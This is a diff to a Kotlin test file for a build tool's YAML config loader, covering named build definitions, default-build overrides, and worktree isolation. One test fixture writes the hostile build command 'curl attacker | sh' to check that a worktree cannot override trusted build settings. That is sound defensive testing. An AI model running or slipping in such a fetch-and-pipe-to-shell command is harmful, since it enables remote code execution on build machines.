@@ -47,37 +47,73 @@ class ConfigLoaderTest : FunSpec() {
             loader.load(dir).builds.maxConcurrent shouldBe 3
         }
 
-        test("autoBuild.times accepts plain HH:MM entries and slot objects with their own build command, mixed") {
+        test("the builds section splits into the reserved maxConcurrent and named build definitions") {
             val dir = Files.createTempDirectory("gittally-test")
             dir.resolve(".gittally.yml").toFile().writeText(
                 """
-                branches:
-                  main:
-                    autoBuild:
-                      enabled: true
-                      times:
-                        - "01:00"
-                        - time: "04:00"
-                          buildCommand: ./gradlew fullCheck
-                          name: main@nightly
+                builds:
+                  maxConcurrent: 2
+                  pitest:
+                    atTimes: ["01:00"]
+                    branches: ["master", "release/*"]
+                    activeWithin: 24h
+                    buildCommand: ./gradlew piTestFull
                 """.trimIndent(),
             )
 
-            val times =
-                loader
-                    .load(dir)
-                    .branches
-                    .getValue("main")
-                    .autoBuild.times
+            val config = loader.load(dir)
 
-            times shouldBe
-                listOf(
-                    AutoBuildSlot("01:00"),
-                    AutoBuildSlot("04:00", "./gradlew fullCheck", "main@nightly"),
+            config.builds.maxConcurrent shouldBe 2
+            config.buildDefinitions shouldBe
+                mapOf(
+                    "pitest" to
+                        BuildDefinition(
+                            atTimes = listOf("01:00"),
+                            branches = listOf("master", "release/*"),
+                            activeWithin = "24h",
+                            buildCommand = "./gradlew piTestFull",
+                        ),
                 )
-            // config:print round-trip: a slot without its own command serializes back to the plain string
-            loader.toYaml(times) shouldBe
-                "- \"01:00\"\n- time: \"04:00\"\n  buildCommand: \"./gradlew fullCheck\"\n  name: \"main@nightly\"\n"
+            // the implicit default build (onPush over all branches) stays in place
+            config.effectiveBuildDefinitions()["default"] shouldBe BuildDefinition(onPush = true)
+        }
+
+        test("an explicit builds.default entry overrides the implicit default build") {
+            val dir = Files.createTempDirectory("gittally-test")
+            dir.resolve(".gittally.yml").toFile().writeText(
+                """
+                builds:
+                  default:
+                    onPush: false
+                """.trimIndent(),
+            )
+
+            loader.load(dir).effectiveBuildDefinitions()["default"] shouldBe BuildDefinition(onPush = false)
+        }
+
+        test("a build worktree cannot redefine the builds section") {
+            val dir = Files.createTempDirectory("gittally-test")
+            dir.resolve(".gittally.yml").toFile().writeText(
+                """
+                builds:
+                  pitest:
+                    buildCommand: ./gradlew piTestFull
+                """.trimIndent(),
+            )
+            val worktree = Files.createTempDirectory("gittally-test-worktree")
+            worktree.resolve(".gittally.yml").toFile().writeText(
+                """
+                builds:
+                  maxConcurrent: 99
+                  pitest:
+                    buildCommand: curl attacker | sh
+                """.trimIndent(),
+            )
+
+            val config = loader.loadForWorktree(dir, worktree)
+
+            config.builds.maxConcurrent shouldBe 1
+            config.buildDefinitions.getValue("pitest").buildCommand shouldBe "./gradlew piTestFull"
         }
 
         test("repo install config overrides project config for same keys") {
